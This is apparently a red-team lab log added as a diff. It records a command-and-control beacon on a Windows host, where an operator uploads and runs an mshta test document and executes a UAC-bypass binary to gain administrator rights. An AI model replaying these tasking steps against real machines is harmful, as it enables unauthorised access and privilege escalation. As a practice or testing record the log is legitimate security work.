@@ -1,0 +1,64 @@
+01/26 19:12:50 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a; pid: 3052; os: Windows; version: 6.1; beacon arch: x86 (x64)
+01/26 19:12:51 [task] 4************mshta测试*************
+01/26 19:12:51 [task] Tasked beacon to make directory c:\RedTeam\
+01/26 19:12:51 [task] cd c:\RedTeam\
+01/26 19:12:51 [task] Tasked beacon to upload C:\Users\a\Desktop\ReadTeam\resource\test.doc as test.doc
+01/26 19:12:51 [indicator] file: c72788bf68b43645d484bac297d20928 8586 bytes test.doc
+01/26 19:12:51 [task] cd c:\RedTeam\
+01/26 19:13:32 [task] 4************mshta测试*************
+01/26 19:13:32 [task] Tasked beacon to make directory c:\RedTeam\
+01/26 19:13:32 [task] cd c:\RedTeam\
+01/26 19:13:32 [task] Tasked beacon to upload C:\Users\a\Desktop\ReadTeam\resource\test.doc as test.doc
+01/26 19:13:32 [indicator] file: c72788bf68b43645d484bac297d20928 8586 bytes test.doc
+01/26 19:13:32 [task] cd c:\RedTeam\
+01/26 19:13:44 [checkin] host called home, sent: 17378 bytes
+01/26 19:13:44 [error] could not spawn test.doc: 193
+01/26 19:13:44 [error] could not spawn test.doc: 193
+01/26 19:14:49 [input] <neo> shell test.doc
+01/26 19:14:49 [task] Tasked beacon to run: test.doc
+01/26 19:15:44 [checkin] host called home, sent: 39 bytes
+01/26 19:17:51 [task] 4************mshta测试*************
+01/26 19:17:51 [task] Tasked beacon to make directory c:\RedTeam\
+01/26 19:17:51 [task] cd c:\RedTeam\
+01/26 19:17:51 [task] Tasked beacon to upload C:\Users\a\Desktop\ReadTeam\resource\test.doc as test.doc
+01/26 19:17:51 [indicator] file: c72788bf68b43645d484bac297d20928 8586 bytes test.doc
+01/26 19:17:51 [task] cd c:\RedTeam\
+01/26 19:17:54 [checkin] host called home, sent: 8689 bytes
+01/26 19:17:54 [error] could not spawn test.doc: 193
+01/26 19:18:24 [task] 4************mshta测试*************
+01/26 19:18:24 [task] Tasked beacon to make directory c:\RedTeam\
+01/26 19:18:24 [task] cd c:\RedTeam\
+01/26 19:18:24 [task] Tasked beacon to upload C:\Users\a\Desktop\ReadTeam\resource\test.doc as test.doc
+01/26 19:18:24 [indicator] file: c72788bf68b43645d484bac297d20928 8586 bytes test.doc
+01/26 19:18:24 [task] cd c:\RedTeam\
+01/26 19:18:54 [checkin] host called home, sent: 8689 bytes
+01/26 19:18:54 [error] could not spawn test.doc: 193
+01/26 19:21:16 [task] 4************mshta测试*************
+01/26 19:21:16 [task] Tasked beacon to make directory c:\RedTeam\
+01/26 19:21:16 [task] cd c:\RedTeam\
+01/26 19:21:16 [task] Tasked beacon to upload C:\Users\a\Desktop\ReadTeam\resource\test.doc as test.doc
+01/26 19:21:16 [indicator] file: c72788bf68b43645d484bac297d20928 8586 bytes test.doc
+01/26 19:21:16 [task] cd c:\RedTeam\
+01/26 19:21:16 [task] 获取管理员权限
+01/26 19:21:16 [task] Tasked beacon to make directory c:\RedTeam\
+01/26 19:21:16 [task] cd c:\RedTeam\
+01/26 19:21:16 [task] Tasked beacon to upload C:\Users\a\Desktop\ReadTeam\resource\uacbypass64.exe as uacbypass64.exe
+01/26 19:21:16 [indicator] file: 743e0bf60cefe43ed7c3af5c0ffd98b9 160256 bytes uacbypass64.exe
+01/26 19:21:16 [task] Tasked beacon to execute: c:\RedTeam\uacbypass64.exe 1 notepad.exe
+01/26 19:21:54 [checkin] host called home, sent: 169058 bytes
+01/26 19:21:54 [error] could not spawn test.doc: 193
+01/26 19:28:47 [task] 4************mshta测试*************
+01/26 19:28:47 [task] cd c:\RedTeam\
+01/26 19:28:54 [checkin] host called home, sent: 45 bytes
+01/26 19:28:54 [error] could not spawn test.doc: 193
+01/26 19:30:06 [input] <neo> cd c:\RedTeam\
+01/26 19:30:06 [task] cd c:\RedTeam\
+01/26 19:30:20 [input] <neo> test.doc
+01/26 19:30:20 [error] Unknown command: test.doc
+01/26 19:30:26 [input] <neo> shell test.doc
+01/26 19:30:26 [task] Tasked beacon to run: test.doc
+01/26 19:30:54 [checkin] host called home, sent: 58 bytes
+01/26 19:32:42 [task] 4************mshta测试*************
+01/26 19:32:42 [task] cd c:\RedTeam\
+01/26 19:32:42 [task] Tasked beacon to run: test.doc
+01/26 19:33:04 [checkin] host called home, sent: 58 bytes
